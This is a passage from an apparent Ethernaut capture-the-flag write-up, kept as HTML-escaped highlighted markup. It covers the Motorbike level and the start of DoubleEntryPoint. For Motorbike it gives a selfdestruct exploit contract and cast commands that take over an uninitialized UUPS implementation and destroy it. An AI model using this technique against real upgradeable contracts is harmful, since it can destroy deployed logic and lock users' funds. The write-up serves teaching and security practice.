&lt;&#x2F;span&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success,) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _logic.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;initialize()&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;Call failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Delegates the current call to `implementation`.
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_delegate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;implementation) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;internal virtual &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; solhint-disable-next-line no-inline-assembly
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;calldatacopy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;calldatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            let result := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gas&lt;&#x2F;span&gt;&lt;span&gt;(), implementation, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;calldatasize&lt;&#x2F;span&gt;&lt;span&gt;(), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;returndatacopy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            switch result
&lt;&#x2F;span&gt;&lt;span&gt;            case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;{ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;()) }
&lt;&#x2F;span&gt;&lt;span&gt;            default { &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;()) }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Fallback function that delegates calls to the address returned by `_implementation()`. 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Will run if no other function in the contract matches the call data
&lt;&#x2F;span&gt;&lt;span&gt;    fallback () &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable virtual &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_delegate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_getAddressSlot&lt;&#x2F;span&gt;&lt;span&gt;(_IMPLEMENTATION_SLOT).value);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Returns an `AddressSlot` with member `value` located at `slot`.
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_getAddressSlot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 &lt;&#x2F;span&gt;&lt;span&gt;slot) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;internal pure &lt;&#x2F;span&gt;&lt;span&gt;returns (AddressSlot storage r) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            r_slot := slot
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Engine &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Initializable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; keccak-256 hash of &amp;quot;eip1967.proxy.implementation&amp;quot; subtracted by 1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 internal constant&lt;&#x2F;span&gt;&lt;span&gt; _IMPLEMENTATION_SLOT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; upgrader;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 public&lt;&#x2F;span&gt;&lt;span&gt; horsePower;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;AddressSlot &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; value;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;initialize&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external initializer &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        horsePower &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        upgrader &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Upgrade the implementation of the proxy to `newImplementation`
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; subsequently execute the function call
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;upgradeToAndCall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;newImplementation, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory &lt;&#x2F;span&gt;&lt;span&gt;data) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_authorizeUpgrade&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_upgradeToAndCall&lt;&#x2F;span&gt;&lt;span&gt;(newImplementation, data);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Restrict to upgrader role
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_authorizeUpgrade&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;internal view &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; upgrader, &amp;quot;Can&amp;#39;t upgrade&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_upgradeToAndCall&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;newImplementation,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory &lt;&#x2F;span&gt;&lt;span&gt;data
&lt;&#x2F;span&gt;&lt;span&gt;    ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Initial upgrade and setup call
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_setImplementation&lt;&#x2F;span&gt;&lt;span&gt;(newImplementation);
&lt;&#x2F;span&gt;&lt;span&gt;        if (data.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length &amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success,) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; newImplementation.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(data);
&lt;&#x2F;span&gt;&lt;span&gt;            require(success, &amp;quot;Call failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Stores a new address in the EIP1967 implementation slot.
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_setImplementation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;newImplementation) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;private &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(Address.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isContract&lt;&#x2F;span&gt;&lt;span&gt;(newImplementation), &amp;quot;ERC1967: new implementation is not a contract&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        AddressSlot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;storage &lt;&#x2F;span&gt;&lt;span&gt;r;
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            r_slot := _IMPLEMENTATION_SLOT
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        r.value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; newImplementation;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Not properly initialized. It means that the specified upgrader can be initialized again at the implementation address&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; deployed at 0x95800066C789e89C33f6Bac781fF16795e0922af
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;suic1de&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;selfdestruct&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;await&lt;&#x2F;span&gt;&lt;span&gt; web3.eth.getStorageAt(instance, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;).then(v=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;v.toString()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;.slice&lt;&#x2F;span&gt;&lt;span&gt;(26)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 &amp;quot;initialize()&amp;quot; --rpc-url https:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key $PRVT
&lt;&#x2F;span&gt;&lt;span&gt;root@aliyunhk:~# cast call 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 &amp;quot;upgrader()&amp;quot; --rpc-url https:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;1rpc.io&#x2F;sepolia
&lt;&#x2F;span&gt;&lt;span&gt;root@aliyunhk:~# chisel
&lt;&#x2F;span&gt;&lt;span&gt;Welcome to Chisel! Type `!help` to show available commands.
&lt;&#x2F;span&gt;&lt;span&gt;➜ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory&lt;&#x2F;span&gt;&lt;span&gt; a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes4&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;suic1de()&amp;quot;)))
&lt;&#x2F;span&gt;&lt;span&gt;➜ a
&lt;&#x2F;span&gt;&lt;span&gt;Type: dynamic &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes
&lt;&#x2F;span&gt;&lt;span&gt;├ Hex (Memory):
&lt;&#x2F;span&gt;&lt;span&gt;├─ Length ([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x00&lt;&#x2F;span&gt;&lt;span&gt;:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000004
&lt;&#x2F;span&gt;&lt;span&gt;├─ Contents ([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;├ Hex (Tuple Encoded):
&lt;&#x2F;span&gt;&lt;span&gt;├─ Pointer ([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x00&lt;&#x2F;span&gt;&lt;span&gt;:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000020
&lt;&#x2F;span&gt;&lt;span&gt;├─ Length ([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;:0x40]): 0x0000000000000000000000000000000000000000000000000000000000000004
&lt;&#x2F;span&gt;&lt;span&gt;└─ Contents ([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x40&lt;&#x2F;span&gt;&lt;span&gt;:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 &amp;quot;upgradeToAndCall(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory&lt;&#x2F;span&gt;&lt;span&gt;)&amp;quot; --rpc-url https:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key $PRVT -- 0x95800066C789e89C33f6Bac781fF16795e0922af 0x82617c2f
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;doubleentrypoint&quot;&gt;DoubleEntryPoint&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;DelegateERC20 &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;value, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;origSender) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IDetectionBot &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;msgData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IForta &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;detectionBotAddress) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
